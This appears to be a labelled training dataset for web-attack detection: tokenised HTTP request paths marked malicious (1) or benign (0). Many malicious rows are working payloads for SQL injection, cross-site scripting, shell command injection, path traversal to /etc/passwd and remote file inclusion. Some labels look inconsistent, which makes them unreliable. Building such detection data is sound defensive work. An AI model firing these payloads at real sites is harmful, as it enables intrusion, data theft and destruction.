request	label
/ string / strings / parameters = 1 %  '  )  )  )  and 3715 in  (  ( char ( 113 )  + char ( 113 )  + char ( 112 )  + char ( 106 )  + char ( 113 )  +  ( select  ( case when  ( 3715 = 3715 )  then char ( 49 )  else char ( 48 )  end )  )  + char ( 113 )  + char ( 122 )  + char ( 118 )  + char ( 122 )  + char ( 113 )  )  )  and  (  (  (  '  %  '  =  ' 	1
/ javascript / dclk . rhtml 	0
/ string / strings / parameters = barbieri guamanzara 	0
/ sdetail8421 / 	0
/ string / strings / parameters = 4ere3id13 	0
"/ index . php ? errcode =  < script > alert (  "" 413375588092 ""  )  ;  <  / script > "	1
/ print-tcp / 	0
/ string / strings / parameters = 1 '  +  ( select pagd where 2484 = 2484 ; select  ( case when  ( 3855 = 3855 )  then 3855 else 1 /  ( select 0 )  end )  -- 	1
/ gc_1163610715312 / 	0
/ ssi / envout . bat ?  | dir  .  .  \  \  .  .  \  \  .  .  \  \  .  .  \  \  .  .  \  \  .  .  \  \  .  .  \  \ 	1
/ string / strings / parameters = tewksbur 	0
/ string / strings / parameters = . espejo 	0
/ string / strings / parameters = ftp :  /  / 192 . 168 . 24 . 203 /  *  < apache_mod_proxy_ftp_glob_xss . nasl > 	1
/ help . php ? q =  '  \ x0adel q56533456  # 	1
/ vertical leap / 	0
/ gy23xnjq . jsp ?  < script > cross_site_scripting . nasl <  / script > 	1
/ string / strings / parameters = <  !  >  <  !  --  --  >  <  ?  >  <  /  > 	1
/ string / strings / parameters = muniello llubet 	0
/ top . php ? stuff =  '  ; uname  > q56884429  # 	1
/ security_antiv / 	0
/ string / modo = registro & login = dongmoon & password = setentavo & nombre = naiara & apellidos = ballester + alumbreo & email = demjanenko @ gesautonomos . io & dni = 56050614m & direccion = c /  + colon + 123 ,  + 6 ? c & ciudad = cantalapiedra & cp = 43143 & provincia = lugo & ntca = 6967344603029050 & b1 = registrar 	1
/ plugins / spamx / editheader . admin . class . php ? _conf [ path ]  = xxpathxx 	1
/ string / strings / parameters = levi 	0
/ string / modo = registro & login = raddie & password = arquitectnico & nombre = vinko & apellidos = monzons + cambeiro & email = goth-komarov @ frenchpolynesia . com . mg & dni = 28174560c & direccion = fernandez + alvarado + 78 +  & ciudad = puente + de + gnave & cp = 44650 & provincia = guipzcoa & ntc = 9370319487845203 & b1 = registrar 	0
/ recordings / index . php ? id =  ' union /  *  *  / select /  *  *  / 0 , 0 , 1161314398 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 -- 	1
/ string / strings / parameters = |   [  2 -ne  $  ( echo oiyjxa  |  tr -d  '  \ n '   |  wc -c )   ]   |  |  sleep 1  & 	1
/ msg45482 / 	0
/ examples / jsp / sessions / include / theme . inc . php ? fullpath =  / etc / passwd \ x00 	1
/ 138855 / 	0
/ topbar_npr / 	0
"/ string / strings / parameters = 1 ""  ""  )  )  )  and  ( 3020 = 3020 )  * 6703 and  (  (  (  ""  "" krxy ""  ""  =  ""  "" krxy "	1
"/ i7prbs22 . php ?  < script > document . cookie =  "" testjnre = 7328 ;  ""  <  / script > "	1
/ cgi-bin / openview5 . exe ? target = main & action =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  / windows / win . ini 	1
/ 140sp409 / 	0
/ string / strings / parameters = echo ymgfhg $  (  ( 56 + 20 )  )  $  ( echo ymgfhg ) ymgfhg & 	1
/  % uff0e % uff0e \  % uff0e % uff0e \  { file } 	1
/ string / strings / parameters = 1 '  )  )  or char ( 119 )  |  | char ( 100 )  |  | char ( 99 )  |  | char ( 121 )  = regexp_substring ( repeat ( right ( char ( 1441 )  , 0 )  , 5000000000 )  , null )  -- 	1
"/ examples / jsp / cal / awstatstotals . php ? sort =  ""  ]  . phpinfo (  )  . exit (  )  .  $ a [  "" "	1
"/ top . php ? stuff =  ""  & rm q91375949 & rem "	1
/ javascript / stored . tar 	0
/ string / strings / parameters = 1 where 6383 = 6383 or elt ( 6272 = 6272 , sleep ( 5 )  )  -- 	1
/ ciscocrack2 / 	0
/ string / strings / parameters = prestamente 	0
/ string / strings / parameters = 17485 	0
"/ main . php ? logout =  ""  \ x0asleep \ x0911 \ x09 # "	1
/ javascript / creator . py 	0
/ sig2004 / 	0
"/ accountlogon . cfm ? rtn = 1 ""  >  < script > alert (  "" 411735577546 ""  )  ;  <  / script >  <  "" 234 "	1
/ 100964960 / 	0
/ main . php ? logout =  '  & uname  # 	1
/ string / modo = insertar & precio = 5289 & b1 = pasar + por + caja '  )  ; waitfor + delay +  ' 0 : 0 : 15 '  ;  -- 	1
/ msg22003 / 	0
"/ 9ko6m4c8 . cfc ?  < meta http-equiv = set-cookie content =  "" testylik = 3403 ""  > "	1
/ main . php ? logout =  '  \ x0auname \ x09 # 	1
/ javascript / showenv . ws 	0
/ string / strings / parameters = aleandro-hayman @ tecnoindomo . nr 	0
/ bookmaker-promotions / 	0
"/ scs86g1p . pl ?  < meta http-equiv = set-cookie content =  "" testquyx = 2820 ""  > "	1
/ nonprofit-activity / 	0
/ examples / servlets / servlet / way-board / way-board . cgi ? db =  / etc / passwd \ x00 	1
/ examples / jsp / cal / index . php ? search =  < script > foo <  / script > 	1
/ string / strings / parameters = llanes 	0
"/ examples / jsp / jsp2 / jspx / user . cgi ? url =  ""  >  < script > alert (  "" gossamer_links_url_xss . nasl ""  )  ;  <  / script >  & from = add "	1
/ chitex-root / 	0
/ user_services / 	0
"/ string / strings / parameters = -4418 ""  ""  or 6872 = 6872 and  ""  "" gbut ""  ""  =  ""  "" gbut "	1
/ adobe_illustrator / 	0
/ string / strings / parameters = fustukian @ comercioenlacalle . tf 	0
/ drhcprxk . html ~ 	0
/ bpaifaq / 	0
/ string / strings / parameters = 1 %  '  or  ( select  *  from  ( select ( sleep ( 5 )  )  ) sddo )  # 	1
/ javascript / text . py 	0
/ string / strings / parameters = silvita 	0
/ javascript / changed . key 	0
/ hr_icon / 	0
/ totsesallpurposedisclaimer168564 / 	0
/ string / strings / parameters = '  ; echo $ ifswzvyqz $  (  ( 68 + 9 )  )  $  ( echo $ ifswzvyqz ) wzvyqz | 	1
/ string / strings / parameters = qui0g6n16si2o 	0
"/ m5103snj . kspx ?  < img src =  "" javascript : alert ( cross_site_scripting . nasl )  ;  ""  > "	1
/ string / strings / parameters = < x ng-focus = x =  $ event id = f tabindex = 0 >  < x ng-if =  [ 1 ]  . map ( x . view . alert )  > 	1
/ string / strings / parameters = ansaldo 	0
/ javascript / nfs . war 	0
/ blpi_qurb / 	0
"/ h21y8w52 . pl ?  < img src =  "" javascript : alert ( cross_site_scripting . nasl )  ;  ""  > "	1
/ string / modo = registro & login = gavens0 & password = revirado & nombre = kaya & apellidos = mojeda + batet & email = munshin @ cirugiaplasticacordoba . hk & dni = 65532112y & direccion = plaza + flauta + 16 ,  + 1 ? b & ciudad = valdeavellano + de + tera & cp = 08672 & provincia = teruel & ntc = 689760410233291a & b1 = registrar 	1
/ 884_104 / 	0
/ scriptpath / index . php ? page = http :  /  / 192 . 168 . 202 . 118 : 8080 / ghl9il ? 	1
/ string / strings / parameters = -5742 '  where 1314 = 1314 or 5903 =  (  ' qqpjq '  |  |  ( select case 5903 when 5903 then 1 else 0 end from rdb $ database )  |  |  ' qzvzq '  )  -- 	1
/ string / str =  $  ( echo osxami )   str1 =  $  {  # str }   if  [  3 -ne  $  { str1 }   ]   then sleep 0  else sleep 1  fi  \  \ 	1
/ bonobush / 	0
/ javascript / submit . temp 	0
/ modifyingeudora / 	0
/ string / strings / parameters = digott_sims @ enigmatico . ar 	0
/ string / str =  $  ( echo bthzml )   str1 =  $  {  # str }   if  [  7 -ne  $  { str1 }   ]   then sleep 0  else sleep 1  fi  \  \ 	1
/ string / strings / parameters = robin @ comerciosdeaspe . info 	0
/ 8539667p-8433435c / 	0
"/ raanw4ia . idc ?  < img src =  "" javascript : alert ( cross_site_scripting . nasl )  ;  ""  > "	1
/ string / strings / parameters = calle jose lopez tafall 192 	0
/ string / strings / parameters = 1 '  )  as bzem where 4240 = 4240 ; select sleep ( 5 )  -- 	1
/ javascript / msg . rtf 	0
"/ top . php ? stuff =  "" ver \ x0b > q12768472 & rem \ x0b "	1
/  /  /  /  /  /  /  /  /  { file } 	1
/ webdav / phprun . php ? cmd = wce . exe 	1
/ classes / auth / openid / message . php ? _env [ asicms ]  [ path ]  = xxpathxx 	1
/ string / strings / parameters = pujalt 	0
/ 3593076 / 	0
/ string / strings / parameters = 1 )  where 9860 = 9860 and 4443 = 4111 -- 	1
/ string / strings / parameters = 4105436805418109 	0
"/ h4bi26jd . asp ?  < script > document . cookie =  "" testhrzx = 1150 ;  ""  <  / script > "	1
"/ help . php ? q =  ""  & ping \ x0b-w \ x0b9000 \ x0b-n \ x0b1 \ x0b1 . 2 . 3 . 4 & rem \ x0b "	1
/ javascript / userlog . bz2 	0
/ string / strings / parameters = sandberg @ 3horas . tl 	0
/ fred eaglesmith - falling stars and broken hearts / 	0
/ javascript / important . py 	0
/ javascript / addpost . pfx 	0
/ string / strings / parameters = paraire credido 	0
/ cgi-home / fileseek2 . cgi ? foot =  ; cat  / etc / passwd & head = 	1
/ weinmann_ap / 	0
/ string / modo = registro & login = quan & password = l71o7o6ne4 & nombre = hermnn & apellidos = estaragu + corts & email = girls @ viscotek . mh & dni = 62336583m & direccion = murill * o ,  + s /  * n ,  + 3 +  ? g & ciudad = aras & cp = 37727 & provincia = granada & ntc = 3043074301340407 & b1 = registrar 	1
/ robbingrussiab172700 / 	0
/ bosoer_02 / 	0
"/ string / strings / parameters = ""  | echo $ ifshasppt $  (  ( 51 + 64 )  )  $  ( echo $ ifshasppt ) hasppt "	1
/ diamond-earrings / 	0
/ string / modo = registro & login = pollack & password = aljuba & nombre = flavio & apellidos = cruz + iparraguirre & email = baggott @ lamola-hotel . name & dni = 97919020q & direccion = sentis + 6 ,  +  & ciudad = castilblanco & cp = 06380 & provincia = soria & ntc = 4291273223594568 & b1 = registrar 	0
"/ d44uk9h2 . idc ?  < script > document . cookie =  "" testmybc = 2088 ;  ""  <  / script > "	1
/ shopping / shopdisplayproducts . asp ? id = 1 & cat =  < script > alert (  ' test '  )  <  / script > 	1
"/ string / strings / parameters = < img + src =  "" jav	ascript : alert ( 1 )  ;  ""  > "	1
"/ main . php ? logout =  ""  ; rm q17425978  # "	1
/ j4drbkil . dll ?  < script > cross_site_scripting . nasl <  / script > 	1
/ javascript / rule . key 	0
/ string / strings / parameters = &  sleep 0  &  &  str =  $  ( echo zepvfu )   &  &  str1 =  $  {  # str }   &  &   [  8 -eq  $  { str1 }   ]   &  &  sleep 1  ' 	1
"/ search . php ? config [  \  "" sipssys \  ""  ]  = http :  /  / cirt . net / rfiinc . txt ? "	1
/ string / strings / parameters = pizani @ unanuevavisionenortodoncia . tg 	0
/ string / modo = registro & login = z * iqia ,  * ng & password = sinttica & nombre = deodato & apellidos = chen + balia & email = chalon @ ingenelec . gl & dni = 00776957v & direccion = calle + la + baeza + 52 +  & ciudad = remolinos & cp = 18570 & provincia = castelln & ntc = 7967285688712382 & b1 = registrar 	1
/ string / strings / parameters = ;  str =  $  ( echo tsxscx )  ;  str1 =  $  {  # str }  ;  if  [  7 -ne  $  { str1 }   ]  ;  then sleep 0 ;  else sleep 1 ;  fi  \  \ 	1
/ string / strings / parameters = 1 '  )  )  )  or exp (  ~  ( select  *  from  ( select concat ( 0x7171706a71 ,  ( select  ( elt ( 6270 = 6270 , 1 )  )  )  , 0x717a767a71 , 0x78 )  ) x )  )  and  (  (  (  ' jwbt '  =  ' jwbt 	1
/ cgi-sys / gwweb . exe ? help = bad-request 	1
/ recordings / man-cgi ? section = 0 & topic = ls ; id 	1
/ string / strings / parameters = '  ;  str =  $  ( echo ghehaj )  ;  str1 =  $  {  # str }  ;  if  [  7 -ne  $  { str1 }   ]  ;  then sleep 0 ;  else sleep 1 ;  fi  | 	1
/ string / strings / parameters = < marquee / finish = confirm ( 2 )  >  / 	1
/ string / strings / parameters = '  |   [  6 -ne  $  ( echo qptcde  |  tr -d  '  \ n '   |  wc -c )   ]   |  |  sleep 1  ' 	1
/ openview5 . exe ? target = main & action =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  / windows / win . ini 	1
/ clk ; 38417351 ; 7163019 ; g / 	1
/ examples / jsp / num / library / adodb / server . php ? sql =  ' adodb_sql_sql_injection . nasl 	1
/ string / strings / parameters = calle fermin salvochea 155 	0
/ string / strings / parameters = 61 	0
/ extras / poll / poll . php ? file_newsportal = xxpathxx 	1
/ button_phishing / 	0
/ string / strings / parameters = 1 %  '  )  )  ( select  ( case when  ( 5451 = 5451 )  then regexp_substring ( repeat ( right ( char ( 5451 )  , 0 )  , 500000000 )  , null )  else char ( 108 )  |  | char ( 76 )  |  | char ( 112 )  |  | char ( 116 )  end )  from information_schema . system_users )  and  (  (  '  %  '  =  ' 	1
/ 177770 / 	0
/ string / strings / parameters = moldero 	0
/ cto_store / 	0
/ msg29859 / 	0
/ 24336-1 / 	0
/ mdpr013105 / 	0
/ store_dummies / 	0
/ string / strings / parameters = 1 ; iif ( 2869 = 9448 , 1 , 1 / 0 ) 	1
/ msg215340 / 	0
"/ modules / mydownloads / ratefile . php ? lid = 1 ""  >  < script > alert (  ' wvs-xss-magic-string-413185588081 '  )  ;  <  / script >  < br name =  "" nothing "	1
/ string / strings / parameters = 37340 	0
"/ 606wkcop . nsf ?  < img src =  "" javascript : alert ( cross_site_scripting . nasl )  ;  ""  > "	1
/ string / strings / parameters = echo $ ifsmfymxe $  (  ( 53 + 41 )  )  $  ( echo $ ifsmfymxe ) mfymxe ' 	1
/ 092206avian / 	0
/ 138514 / 	0
/ string / strings / parameters = 1856004857366548 	0
/ string / modo = entrar & login = jasver9 '  )  ; waitfor + delay +  ' 0 : 0 : 15 '  ;  --  & pwd = 76r9v3t2 & remember = off & b1 = entrar 	1
/ race the sun / 	0
/ pagedesign / 	0
/ de3v2dd9 . mscgi ?  < script > cross_site_scripting . nasl <  / script > 	1
/ string / strings / parameters = -6554 '  )  )  )  union all select 4384 , 4384 , 4384 , 4384 , 4384 # 	1
"/ help . php ? q =  "" uname \ x09 > q12928131 \ x09 # "	1
/ string / modo = entrar & login = hiscoe & pwd = laicismo & remember = on & b1 = entrar 	0
/ javascript / poi . bat 	0
"/ byrg33fw . pl ?  < meta http-equiv = set-cookie content =  "" testexuu = 5340 ""  > "	1
/ anti_bisexual / 	0
/ raanw4ia . php3 ?  < script > cross_site_scripting . nasl <  / script > 	1
"/ string / strings / parameters = ""   str =  $  ( echo sfurkw )   str1 =  $  {  # str }   if  [  2 -ne  $  { str1 }   ]   then sleep 0  else sleep 1  fi  & "	1
/ javascript / media . out 	0
/ string / strings / parameters = c /  arquitecto ricardo velazquez bosco ,  127 ,  3g 	0
/ 000025534 / 	0
/ page-2316 / 	0
/ recordings / index . php ? src = 1 & _common = 1 & time = 1331919010 & action = show_view & module = calendarmodule & view =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd \ x00 	1
/ string / strings / parameters = < body onload !  #  $  %  &  (  )  *  ~  + -_ .  ,  :  ;  ?  @  [  /  |  \  \  ]  ^  `  = document . cookie = true ;  > 	1
"/ cgi-bin / search . jsp ? q =  %  ""  < script > alert ( 1331918998 )  <  / script > "	1
/ wfb_footer / 	0
/ string / strings / parameters = lucas fiallega 	0
/ whitecorner-lr / 	0
/ javascript / blog . gif 	0
/ javascript / cal . png 	0
/ strich-l / 	0
"/ moodle / filter / tex / texed . php ? formdata = foo & pathname = foo ""  ; ls + -l ; chmod + 555 +  / tmp / xjmtpvepcz ;  "" "	1
/ string / strings / parameters = gen7o 	0
/ string / strings / parameters = & echo $ ifsrgsnff $  (  ( 14 + 60 )  )  $  ( echo $ ifsrgsnff ) rgsnff ' 	1
/ string / strings / parameters = zool7ic1 	0
"/ string / strings / parameters = 1 %  ""  ""  )  and row ( 6237 , 7469 )  >  ( select count (  *  )  , concat ( 0x7171706a71 ,  ( select  ( elt ( 6237 = 6237 , 1 )  )  )  , 0x717a767a71 , floor ( rand ( 0 )  * 2 )  ) x from  ( select 5192 union select 3785 union select 3931 union select 7158 ) a group by x )  and  (  ""  ""  %  ""  ""  =  ""  "" "	1
/ string / strings / parameters = 1872 	0
/ 191902060 / 	0
/ scripts / dcforum . cgi ? az = list & forum =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd \ x00 	1
/ javascript / android . html 	0
/ m_900740180 / 	0
"/ string / strings / parameters = 1 ""  ""  and 3707 =  ( select count (  *  )  from sysibm . systables as t1 , sysibm . systables as t2 , sysibm . systables as t3 )  and  ""  "" hvwv ""  ""  =  ""  "" hvwv "	1
/ javascript / bz2 . png 	0
/ s6264-fwportal_exe / 	0
/ javascript / old . swf 	0
/ string / strings / parameters = borzani jordan 	0
"/ examples / jsp / jsp2 / jspx ? username =  ""  < script > foo <  / script "	1
/ lr2005_researchsvcsdri / 	0
/ modules / calendar / scheme . php ? calpath = xxpathxx ? 	1
/ string / strings / parameters = e46ola5 	0
/ msg27525268 / 	0
"/ cgi-bin / dsweb / services / user-1 ""  >  < body onload = alert (  ' xerox_docushare_dsweb_xss . nasl '  )  > "	1
/ search-md / 	0
/ string / strings / parameters = pl .  torres de omaa 123 6-f 	0
/ openpanorama / 	0
/ scripts / spaw / dialogs / confirm . php ? spaw_root =  / etc / passwd \ x00 	1
/ string / strings / parameters = 1 '  )  )  )  rlike  ( select  ( case when  ( 7689 = 7689 )  then 1 else 0x28 end )  )  and  (  (  (  ' gsjp '  =  ' gsjp 	1
/ string / strings / parameters = saetill . a 	0
"/ o1zj4u9v . do ?  < meta http-equiv = set-cookie content =  "" testabrn = 6368 ""  > "	1
/ ipswitch_suite / 	0
/ invisible-quest / 	0
/ string / strings / parameters = jackley @ engibraltar . com . nu 	0
/ 140156 / 	0
/ gifgalaxy / 	0
/ string / strings / parameters = 1 )  )  )  and char ( 120 )  |  | char ( 106 )  |  | char ( 117 )  |  | char ( 85 )  = regexp_substring ( repeat ( right ( char ( 9981 )  , 0 )  , 5000000000 )  , null )  and  (  (  ( 7484 = 7484 	1
/ string / strings / parameters = pozuelo de calatrava 	0
/ vwguide / 	0
/ string / modo = insertar '  ;  + drop + table + usuarios ;  + select +  *  + from + datos + where + nombre + like +  ' % & precio = 6072 & b1 = pasar + por + caja 	1
/ string / modo = registro & login = brasset & password = vidrioso & nombre = aminda & apellidos = pinar + vives & email = bumatai @ aldufa . pf & dni = 86651591b & direccion = travesia + carpio + y + torta ,  + 133 +  & ciudad = jaraicejo & cp = 09640 & provincia = vila & ntc = 5011187157349121 & b1 = registrar 	0
/ 174967 / 	0
/ string / strings / parameters = '  &  sleep 0  &  &  str =  $  ( echo ausqym )   &  &  str1 =  $  {  # str }   &  &   [  1 -eq  $  { str1 }   ]   &  &  sleep 1  /  / 	1
/ keirseyorgcomplexity / 	0
/ string / strings / parameters = or 1 /  * 	1
"/ string / strings / parameters = & lt ; meta http-equiv =  \  "" link \  ""  content =  \  ""  & lt ; http &  # 58 ;  /  / ha &  # 46 ; ckers &  # 46 ; org / xss &  # 46 ; css & gt ;  ;  rel = stylesheet \  ""  & gt ; "	1
/ education_article / 	0
/ 2059225 / 	0
/ examples / jsp / colors / shopexd . asp ? catalogid =  ' 42 	1
/ string / strings / parameters = |  | echo $ ifsyxcwnr $  (  ( 16 + 34 )  )  $  ( echo $ ifsyxcwnr ) yxcwnr 	1
/ cgi / pfdispaly . cgi ?  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd 	1
/ string / strings / parameters = & lt ; img src = javascript &  # 058 ; alert (  ' xss '  )  & gt ; 	1
"/ 5qnlm5z2 . dll ?  < meta http-equiv = set-cookie content =  "" testsixi = 8451 ""  > "	1
/ cgi-bin / hello . bat ?  & dir + c :  \  \ 	0
/ javascript / backdoor . vbs 	0
/ infocom-worm / 	0
/ gamesbanner / 	0
"/ string / strings / parameters = &  sleep 0  &  &  str =  $  ( echo usnhdt )   &  &  str1 =  $  {  # str }   &  &   [  4 -eq  $  { str1 }   ]   &  &  sleep 1  "" "	1
/ ncsacmp / 	0
/ javascript / 12 . ora 	0
/ modules . php ? name = your_account & op = userinfo & username = bla < script > alert ( document . cookie )  <  / script > 	1
